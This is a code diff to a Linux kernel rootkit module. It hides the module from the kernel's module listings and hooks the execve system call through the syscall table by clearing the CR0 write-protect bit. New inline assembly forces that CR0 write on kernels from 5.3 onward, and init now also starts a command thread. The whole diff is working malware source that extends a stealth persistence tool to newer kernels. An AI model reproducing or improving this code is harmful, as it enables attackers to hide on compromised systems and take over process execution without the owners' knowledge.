@@ -1,5 +1,6 @@
 #include <linux/module.h>
 #include <linux/init.h>
+#include <linux/version.h>
 #include <linux/sched.h>
 #include <linux/kthread.h>
 #include <linux/delay.h>
@@ -17,6 +18,7 @@ struct task_struct *rk_kthread;
 unsigned long *syscall_table = NULL;
 pte_t *pte;
 
+extern unsigned long __force_order;
 
 asmlinkage int
 (*real_execve)(const char *filename, char *const argv[], char *const envp[]);
@@ -47,7 +49,7 @@ rk_thread(void *data)
 }
 
 void
-start_cmd_thread(void)
+rk_start_cmd_thread(void)
 {
 	int cpu = 0;
 #ifdef DEBUG
@@ -71,21 +73,32 @@ rk_hide(void)
 	THIS_MODULE->notes_attrs = NULL;
 }
 
+inline void rk_write_cr0(unsigned long cr0) {
+	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
+}
 void
+
 rk_hijack_execve(void)
 {
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4,3,0)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
 	unsigned int level;
 	syscall_table = NULL;
 
 	syscall_table = (void *)kallsyms_lookup_name("sys_call_table");
 	pte = lookup_address((long unsigned int)syscall_table, &level);
-
+#ifdef DEBUG
+	pr_info("%s: syscall_table is at %p\n", RK_NAME, syscall_table);
+	pr_info("%s: PTE address located %p\n", RK_NAME, &pte);
+#endif
 	if (syscall_table != NULL) {
 		write_cr0 (read_cr0 () & (~ 0x10000));
 		real_execve = (void *)syscall_table[__NR_execve];
 		syscall_table[__NR_execve] = &new_execve;
 		write_cr0 (read_cr0 () | 0x10000);
+#ifdef DEBUG
+	pr_info("%s: execve is at %p\n", RK_NAME, real_execve);
+	pr_info("%s: syscall_table[__NR_execve] hooked\n", RK_NAME);
+#endif
 	} else {
 		// TODO: If not debug what?
 #ifdef DEBUG
@@ -93,15 +106,16 @@ rk_hijack_execve(void)
 #endif
 	}
 #else
-	// TODO: Implement syscall hijack for kern after 5.3 with cr0 write
-	// protection.
+	unsigned long cr0 = read_cr0();
+	clear_bit(16, &cr0);
+	rk_write_cr0(cr0);
 #endif
 }
 
 void
 rk_unhijack_execve(void)
 {
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4,3,0)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,3,0)
 	if (syscall_table != NULL) {
 		write_cr0 (read_cr0 () & (~ 0x10000));
 		syscall_table[__NR_execve] = real_execve;
@@ -116,7 +130,9 @@ rk_unhijack_execve(void)
 #endif
 	}
 #else
-	// TODO: smae as rk_hijack_execve
+	unsigned long cr0 = read_cr0();
+	set_bit(16, &cr0);
+	rk_write_cr0(cr0);
 #endif
 }
 
@@ -129,6 +145,7 @@ rk_init(void)
 	rk_hide();
 #endif
 	rk_hijack_execve();
+	rk_start_cmd_thread();
 	return 0;
 }
 
